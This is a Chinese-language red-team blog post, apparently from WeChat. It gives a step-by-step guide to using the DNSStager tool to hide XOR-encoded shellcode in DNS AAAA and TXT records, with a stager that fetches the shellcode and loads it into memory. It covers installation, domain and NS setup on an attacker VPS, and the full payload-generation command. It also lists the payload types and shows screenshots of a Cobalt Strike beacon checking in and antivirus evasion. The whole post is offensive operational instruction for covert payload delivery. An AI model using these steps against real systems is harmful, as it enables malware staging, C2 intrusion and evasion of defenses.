> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bM_rsh8KxXwwyEkbHRTKsw)

**1.DNSStager 介绍**

类似于 shellcode 分离免杀的思路，DNSStager 是用来帮助红队人员执行在 DNS 隐藏多段 shellcode，通过多次请求 dns 查询，达到加载 shellcode 内容然后上线的目的。

其原理是：将你申请的根域名（如 gendns.tk）作为 ns 服务器，提供 test.gendns.tk 子域名的解析服务，然后工具在本地对 test.gendns.tk 建立多个 AAAA 记录的 IPV6 地址，生成运行程序循环请求这些个记录，拼接 AAAA 记录作为 shellcode 加载，从而达到上线的目的。

优点：

1 加载 shellcode 为外部 dns 请求，防火墙很少拦截。

2 使用 xor 加密程序运行，免杀部分 AV。

工具基于多个 DNS 记录，如开源工具 IPv6  和 TXT  并再注入到内存中并运行它。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKelHNAjSc7AUutTcVIALiaowsYSsyRUM7H0H3zQkicE1ReMiahekSrawBQ/640?wx_fmt=png)

官方地址：https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns/

DNSStager 将创建一个伪造的 DNS 服务器，该服务器将根据 AAAA 和 TXT 记录解析您的域的伪造地址，这些地址将呈现您的有效负载的一部分，该净荷已编码 / 加密并可供代理使用。

**2.DNSStager 使用条件**
====================

要安装 DNSStager，您需要首先使用以下命令从官方存储库中克隆它：

```
git clone https://github.com/mhaskar/DNSStager
```

然后使用以下命令安装 DNSStager 的所有 python 要求：  

```
pip3 install -r requirements.txt
```

此外需要注意的是，需要禁用本机的 systemd-resolved 服务:

```
sudo service systemd-resolved stop
sudo systemctl disable systemd-resolved
```

环境可选 c。

golang；c 需要安装 ming-w64（这里推荐 ubuntu、kali 系统，centos 上楼主尝试多次安装 ming-w64 均失败）：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKyUibuJwkOJDpXtbqJB6dM6oB9KezjI9LS3W3Nj1bT1FJ89u51hTKKeQ/640?wx_fmt=png)

golang 需要 GoLang version 1.16.3，并安装

*   golang.org/x/sys
    
*   github.com/miekg/dns
    

这两个第三方依赖库（golang 扩展目前还未复现成功，go-1.16 各种坑）。

**3. 域名的配置**
============

使用 DNSStager 作为 shellcode 存储媒介，当然要有一个域名，可在美国 freenom 等服务商处申请（楼主各种失败，最后只能花钱买一个），申请好后需要解析 NS

到第三方域名服务商，例如 dnspod，cloudflare，在这些地方添加子域名 test.gendns.tk 的 NS 记录到你自己的 vps 才可以。

前提：VPS 对外开放 53 端口的 UDP 数据，提供 NS 查询。

具体如何使用 cloudflare 请参考《实战填坑 | CS 使用 CDN 隐藏 C2》

[https://mp.weixin.qq.com/s/B30Unfh5yAN4A151P1gsMQ](https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496969&idx=1&sn=eeda795dcd95bcf19ebc8e26546a6b97&scene=21#wechat_redirect)

CDN 配置以 cloudflare 为例，在 DNS 选项处添加 NS 记录：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEK5aDskzZFZC972UlFRBgsBc8BTo7bVf8RoX1Iq44G0gy00bzgGnd2Pg/640?wx_fmt=png)

最后的效果：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKwxuxsia6eASLekWabBhxTiaUrpJXqspibWF5PnIN6QpPwiaC03SVWqH3hw/640?wx_fmt=png)

在你填写的 vps 中下载工具，使用方法（payload 以 x64/c/ipv6 为例）：

```
dnsstager.py --domain test.gendns.tk --payload x64/c/ipv6 --output /home/a.exe --prefix cloud-srv- --shellcode_path /home/DNSStager/payload.bin --sleep 1 --xorkey 0x10
```

其中 payload 有多种，使用 python 3 dnsstager.py –payloads 查看：  

```
x64/c/ipv6      Resolve your payload as IPV6 addresses xored with custom key via compiled x64 C code
x86/c/ipv6      Resolve your payload as IPV6 addresses xored with custom key via compiled x86 C code
x64/golang/txt      Resolve your payload as TXT records encoded using base64 compiled x64 GoLang code
x64/golang/ipv6      Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code
x86/golang/txt      Resolve your payload as TXT records encoded using base64 compiled x86 GoLang code
x86/golang/ipv6      Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code
```

注意：其中 --prefix cdn 参数的 cloud-srv - 可自由配置，就是在 test.gendns.tk 之前添加 NS 子域名，作为多个 shellcode 分片存储媒介。

**4. 工具的使用**
============

在运行工具后会在本机监听 53 端口：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKm2x8zEic6l8opTEEYba2Ouic5wKNgf4H3NCdiauaO73HvGSEL5nqiaribvw/640?wx_fmt=png)操作之前使用 dig 命令可检查 ns 域名：dig AAAA cloud-srv-0.test.gendns.tk

未成功时：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKSg7ww9ia2GeDtYVjkBJKgN5aibNDdCNwSAlJZle2cj04MNWvPnVdCriag/640?wx_fmt=png)

已经插入了 AAAA 记录：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKRVPTQutnnTNnEskm02o0rFphsyuu3SL3oX3iaos38SZO7Dcm7ibthobQ/640?wx_fmt=png)

使用 dig 命令查询会看到记录，运行程序后监听端也会看到：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKqABSyTlccWaMoPuDwcwwuuFy0lcQ7RPL7P2af3iaW1S8fV23nnOQgXQ/640?wx_fmt=png)

提示共需要发送 56 次 dns 查询请求才能加载完毕 shellcode：DNSStager will send 56 DNS requests to get the full payload，意为在 vps 建立了 56 个 cloud-srv-*.test.gendns.tk NS 记录。

wireshark 抓包可见请求 AAAA 记录：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKJYmZGt5D3QibV0OGg8IkoKRuQfqJVkpBpmw9907K8EiaoxApcaYh7SPA/640?wx_fmt=png)

最后 CS 上线：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEKJUu2hKcWjD8lv5WBC6ibywXGvSJU8lR2UxH0WicULsvlbzKporUCny0A/640?wx_fmt=png)

免杀效果  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouibgt3bGyUL3FGiadA36NNWEK8BTrm2ylaTRVnxp0rjatUNTzVzhaRt4C9IyImhfx8ZVSaNBGD3xjCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

**[CS 如何配置通过 CDN 上线](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247490277&idx=1&sn=62528cb1168e28003a59d693ec44006e&chksm=ec1f4fdadb68c6cc111edb7fa3b33c8e868c294e6eaee2127e912f24db8636be3e800e53a2d1&scene=21#wechat_redirect)**

**[实战填坑 | CS 使用 CDN 隐藏 C2](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496969&idx=1&sn=eeda795dcd95bcf19ebc8e26546a6b97&chksm=ec1ca036db6b292077206bdf2be3fcc739f4da72bc49222cb44f4467219be6757ceb7585e8d3&scene=21#wechat_redirect)  
**

本月报名可以参加抽奖送暗夜精灵 6Pro 笔记本电脑的优惠活动  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496998&idx=1&sn=da047300e19463fc88fcd3e76fda4203&chksm=ec1ca019db6b290f06c736843c2713464a65e6b6dbeac9699abf0b0a34d5ef442de4654d8308&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：伞

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)